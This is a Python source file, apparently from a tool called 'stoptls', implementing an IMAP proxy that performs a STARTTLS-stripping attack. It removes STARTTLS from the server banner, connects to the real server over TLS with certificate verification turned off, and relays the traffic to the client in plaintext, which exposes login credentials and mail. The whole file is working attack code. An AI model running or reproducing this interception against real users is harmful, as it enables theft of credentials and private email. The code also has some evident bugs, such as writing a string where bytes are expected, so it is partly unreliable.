import asyncio
import logging
import socket
import ssl

from stoptls.tcp.base import TCPProxy
from stoptls.tcp import regex


class IMAPProxy(TCPProxy):
    def __init__(self):
        super().__init__(dst_port=143)

    async def strip(self, client_reader, client_writer):
        dst_address = self.get_orig_ip(client_reader)
        logging.debug('Original destination: {}'.format(dst_address))
        server_reader, server_writer = await asyncio.open_connection(dst_address,
                                                                     self.dst_port)
        banner = await server_reader.readline()
        logging.debug('Received banner: {}'.format(banner))

        banner = banner.decode('ascii')
        banner_re = regex.IMAP_RESPONSE.fullmatch(banner)

        if banner_re.group('response') and \
           regex.STARTTLS.search(banner_re.group('response')):
            banner = regex.STARTTLS.sub('', banner_re.group(0))
            server_writer.write(b'asdf STARTTLS\n')
            await server_writer.drain()

            tls_started = await server_reader.readline()
            logging.debug('Received data from server: {}'.format(tls_started))
            tls_started_re = regex.IMAP_RESPONSE.fullmatch(tls_started.decode('ascii'))

            if tls_started_re and tls_started_re.group('ok'):
                sc = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
                sc.check_hostname = False
                sc.verify_mode = ssl.CERT_NONE

                nameinfo = await asyncio.get_running_loop()\
                                        .getnameinfo((dst_address,
                                                      self.dst_port),
                                                     socket.NI_NAMEREQD)
                server_reader, server_writer = await asyncio.open_connection(sock=server_writer.get_extra_info('socket'),
                                                                             ssl=sc,
                                                                             server_hostname=nameinfo[0])
                logging.debug('Sucessfully upgraded to TLS!')
            else:
                logging.debug('Failed to upgraded to TLS')

        client_writer.write(banner.encode('ascii'))
        logging.debug('Writing banner to client...')
        await client_writer.drain()

        while not server_reader.at_eof():
            client_data = await client_reader.readline()
            logging.debug('Received client data: {}'.format(client_data))

            if client_reader.at_eof():
                logging.debug('Client closed connection')
                break

            client_data_re = regex.IMAP_COMMAND.fullmatch(client_data.decode('ascii'))

            # Handle case where client attempts to upgrade to SSL/TLS
            # If we reach this point, this means that we were unable to
            # ugrade to TLS after the initial banner, either because
            # the server didn't support it or because the upgrade process
            # failed
            if tls_started_re and \
               tls_started_re.group('bad') and \
               client_data_re and \
               client_data_re.group('tag') and \
               client_data_re.group('cmd').lower() == 'starttls':
                response = '{} BAD error in IMAP command received by server'\
                    .format(client_data_re.tag)
                client_writer.write(response)
                await client_writer.drain()
                continue

            try:
                server_writer.write(client_data)
                logging.debug('Writing client data to server...')
                await server_writer.drain()
            except ConnectionResetError:
                break

            while True:
                logging.debug('Reading from server...')
                server_data = await server_reader.readline()

                if server_reader.at_eof():
                    logging.debug('Server closed connection')
                    break

                logging.debug('Received server data: {}'.format(server_data))
                client_writer.write(server_data)
                logging.debug('Writing server data to client...')
                await client_writer.drain()

                server_data_re = regex.IMAP_RESPONSE.fullmatch(server_data.decode('ascii'))

                if server_data_re.group('tag') != '*' or \
                   server_data_re.group('bad'):
                    break

        server_writer.close()
        client_writer.close()
        logging.debug('Connections closed')
